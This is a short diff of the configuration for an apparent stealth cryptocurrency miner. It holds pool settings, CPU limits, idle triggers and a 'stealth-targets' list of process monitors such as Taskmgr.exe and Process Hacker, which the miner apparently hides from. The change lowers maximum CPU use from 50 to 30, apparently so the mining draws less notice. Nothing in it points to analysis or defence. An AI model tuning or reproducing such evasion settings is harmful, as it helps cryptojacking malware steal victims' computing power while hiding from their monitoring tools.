@@ -6,7 +6,7 @@
     "password": "like",
     "nicehash": false,
     "ssltls": true,
-    "max-cpu": 50,
+    "max-cpu": 30,
     "idle-wait": 5,
     "idle-cpu": 80,
     "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
